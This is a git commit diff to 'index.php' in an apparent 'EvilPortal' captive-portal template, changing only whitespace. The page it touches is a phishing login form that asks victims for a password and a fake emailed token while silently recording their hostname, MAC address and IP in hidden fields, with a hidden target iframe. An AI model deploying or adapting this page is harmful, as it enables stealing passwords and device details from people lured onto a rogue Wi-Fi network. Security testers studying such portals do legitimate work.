7f30b5d072a6038c4aa672bb38bc001f51b370be
H4xl0r <31049432+H4xl0r@users.noreply.github.com>
2020-05-31 19:03:25 +0200

    Update index.php

--- EvilPortal/includes/token_skeleton/index.php
+++ EvilPortal/includes/token_skeleton/index.php
@@ -18,7 +18,6 @@ function increment_browser($browser)
     }
     return $ret;
 }
-
 function identifyUserAgent($userAgent)
 {
     if (preg_match('/(MSIE|Trident|(?!Gecko.+)Firefox)/', $userAgent)) {
@@ -39,7 +38,6 @@ function identifyUserAgent($userAgent)
 }
 identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
 ?>
-
 <HTML>
     <HEAD>
         <title>Evil Portal</title>
@@ -48,7 +46,6 @@ identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
         <meta http-equiv="Expires" content="0" />
         <meta name="viewport" content="width=device-width, initial-scale=1">
     </HEAD>
-
     <BODY>
         <div style="text-align: center;">
             <h1>Evil Portal</h1>
@@ -65,8 +62,8 @@ identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
             <br><br>
             <input id='pw-input' name='gpw' type="password" class='g-input' placeholder="Password" autofocus="true" autocorrect="off" autocomplete="on" autocapitalize="off"  required>
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
-				<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-				<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+	    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+	    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="gettoken" value="gettoken">
             <br><br>
             <button type="submit">Get Token</button>
@@ -77,13 +74,13 @@ identifyUserAgent($_SERVER['HTTP_USER_AGENT']);
             <p>Enter Your Token</p>
             <p>Your Token has been send to your E-Mail<br>Enter the Token to continue </p>
             <input name='token' id='token-input' type="text" class='g-input' placeholder="TOKEN" autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off"  required>
-				<input type="hidden" name="getaccess" value="getaccess">
-				<input type="hidden" name="target" value="<?=$destination?>">
-				<br><br>
+	    <input type="hidden" name="getaccess" value="getaccess">
+	    <input type="hidden" name="target" value="<?=$destination?>">
+	    <br><br>
             <button type="submit">Authorize</button>
             </form>
+		
         </div>
          <iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe> <!-- Hidden Target Frame -->
     </BODY>
-
 </HTML>
